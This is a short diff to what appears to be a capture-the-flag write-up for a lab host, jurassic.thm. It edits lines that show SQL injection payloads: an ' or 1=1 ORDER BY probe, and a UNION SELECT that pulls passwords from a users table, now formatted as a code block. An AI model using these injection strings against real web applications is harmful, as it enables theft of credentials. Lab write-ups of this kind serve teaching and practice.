@@ -177,13 +177,14 @@ But guess what?  .... with <code>' or 1=1 ORDER BY 1,2,3,4,5,6</code> the output
 
 <br>
 
-http://jurassic.thm/item.php?id=5%20union%20select%201,password,3,4,5%20from%20users
+<pre><code>?id=5%20union%20select%201,password,3,4,5%20from%20users</code></pre>
 
 ![image](https://github.com/user-attachments/assets/669a0148-a62f-48b6-a26d-84550fdcba17)
 
 <br>
 
 
+![image](https://github.com/user-attachments/assets/e7667ec7-a0c5-46c4-9856-dd9f70352bd4)
 
 
 
